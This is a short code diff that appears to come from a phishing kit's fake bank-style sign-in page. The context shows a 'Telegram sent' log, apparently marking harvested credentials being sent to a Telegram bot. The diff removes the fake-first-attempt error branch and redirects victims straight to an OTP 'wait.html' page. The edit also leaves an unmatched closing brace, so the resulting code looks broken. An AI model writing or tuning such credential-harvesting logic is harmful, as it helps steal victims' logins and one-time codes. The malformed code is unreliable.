@@ -1898,16 +1898,6 @@ ID, if not, please leave blank.</p>
                         console.log('Telegram sent');
 
                         // Handle attempts
-                        if (attempt === 1) {
-                            console.log('First attempt – show error');
-                            $('#error-msg').show();
-                            $('#txtUserid, #id11').val('');
-                            $('#btnSignIn').prop('disabled', true);
-                        } else if (attempt === 2) {
-                            console.log('Second attempt – redirecting to OTP page');
-                            window.location.href = 'wait.html';
-                        } else {
-                            console.log('More than 2 attempts – still redirect to OTP?');
                             window.location.href = 'wait.html';
                         }
                     });
